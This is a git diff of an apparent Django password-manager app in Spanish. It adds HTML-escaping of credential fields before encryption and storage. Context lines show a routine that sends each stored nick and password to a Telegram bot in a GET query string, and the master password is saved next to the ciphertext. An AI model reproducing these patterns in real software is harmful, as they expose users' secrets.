@@ -320,6 +320,14 @@ def pagina(request):
     if request.method == 'GET':
         return render(request, template)
 
+''' Escapa los caracteres especiales para evitar inyecciones '''
+def escacapar_carecteres_credenciales(lista_datos):
+	 resultado = []
+	 for dato in lista_datos:
+	 	dato = html.escape(dato)
+	 	resultado.append(dato)
+	 return resultado
+
 '''Genera una cadena de 16 caracteres, aleatoria y de tipo string, con el fin de utilizarlo con el cifrado de la contraseña'''   
 def generar_master_password():
 	 caracteres = string.ascii_letters + string.digits + string.punctuation
@@ -351,17 +359,19 @@ def formulario_credenciales(request):
    	  detallesExtra = request.POST.get('extra', '').strip()
    	  password = request.POST.get('password', '').strip()
    	  
+   	  lista_datos = [nombreCuenta, usuario, url, detallesExtra, password]
+   	  lista = escacapar_carecteres_credenciales(lista_datos)
    	  llave_foranea = models.Usuarios.objects.get(nick=nick)   	  
    	  
-   	  password, iv, master_password = cifrar_password_credenciales(password)
+   	  password, iv, master_password = cifrar_password_credenciales(lista[4])
    	  
    	  credenciales = models.Credenciales()
-   	  credenciales.nombreCuenta = nombreCuenta
-   	  credenciales.usuario = usuario
+   	  credenciales.nombreCuenta = lista[0]
+   	  credenciales.usuario = lista[1]
    	  credenciales.iv = iv
    	  credenciales.password = password
-   	  credenciales.url = url
-   	  credenciales.detallesExtra = detallesExtra
+   	  credenciales.url = lista[2]
+   	  credenciales.detallesExtra = lista[3]
    	  credenciales.id_usuario = llave_foranea
    	  credenciales.master_password = master_password   	  	
    	  credenciales.save()
@@ -470,7 +480,6 @@ def llavePublica(request):
     	  usuarios = Credencial.nick
     	  
     	  if llave_publica == llave_publica_almacenada:
-    	  	#mensaje = 'nombre de la cuenta: ' + usuarios + ' password: ' + passwords
     	  	for credencial in passwords:
     	  		mensaje_enviado = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&parse_mode=Markdown&text=' + credencial.nick + credencial.password
     	  		requests.get(mensaje_enviado)
